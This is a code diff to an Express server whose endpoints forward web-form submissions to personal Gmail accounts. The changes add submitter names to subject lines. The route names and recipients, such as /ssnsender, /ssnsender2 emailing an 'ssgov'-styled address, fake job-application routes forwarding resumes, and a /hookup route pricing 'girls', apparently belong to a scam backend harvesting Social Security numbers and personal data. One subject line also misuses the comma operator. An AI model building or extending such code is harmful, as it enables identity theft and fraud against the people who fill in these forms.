@@ -90,7 +90,7 @@ app.post("/send-email", cpUpload, (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidleonardo385@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission ${first_name, last_name}`, // Subject line
     text: message, // plain text body
     attachments: [
       resume ? { filename: resume.originalname, content: resume.buffer } : null,
@@ -151,7 +151,7 @@ app.post("/sender", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidleonardo385@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission ${email}`, // Subject line
     text: message, // plain text body
   };
 
@@ -210,7 +210,7 @@ app.post("/arnoldsender", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidmiller4504@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission ${firstName}`, // Subject line
     text: message, // plain text body
   };
 
@@ -246,7 +246,7 @@ app.post("/ssnsender", async (req, res) => {
 
   // Construct email message
   const message = `
-    You go a new information from:
+    You go a new information from ${fullName}:
 
     Full Name: ${fullName}
 
@@ -288,7 +288,7 @@ app.post("/ssnsender", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "masonwilfred01@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission ${fullName}`, // Subject line
     text: message, // plain text body
   };
 
@@ -324,7 +324,7 @@ app.post("/ssnsender2", async (req, res) => {
 
   // Construct email message
   const message = `
-    You go a new information from:
+    You go a new information from ${fullName}:
 
     Full Name: ${fullName}
 
@@ -366,7 +366,7 @@ app.post("/ssnsender2", async (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "ssgov7613@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission ${fullName}`, // Subject line
     text: message, // plain text body
   };
 
@@ -433,7 +433,7 @@ app.post("/hookup", async (req, res) => {
 
   // // Construct email message
   const message = `
-    You go a new information from:
+    You go a new information from ${email}:
 
     Girl Name: ${item.name}
     Girl Price:  ${item.price}
@@ -494,7 +494,7 @@ app.post("/stewjob", jobUpload, (req, res) => {
 
   // Construct email message
   const message = `
-    Contact Information:
+    Contact Information from ${fullname}:
     Full Name: ${fullname}
     Number: ${number}
     Email: ${email}
@@ -515,7 +515,7 @@ app.post("/stewjob", jobUpload, (req, res) => {
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidmiller4504@gmail.com", // list of receivers
-    subject: "New Contact Form Submission", // Subject line
+    subject: `New Contact Form Submission from ${fullname}`, // Subject line
     text: message, // plain text body
     attachments: [
       resume ? { filename: resume.originalname, content: resume.buffer } : null,
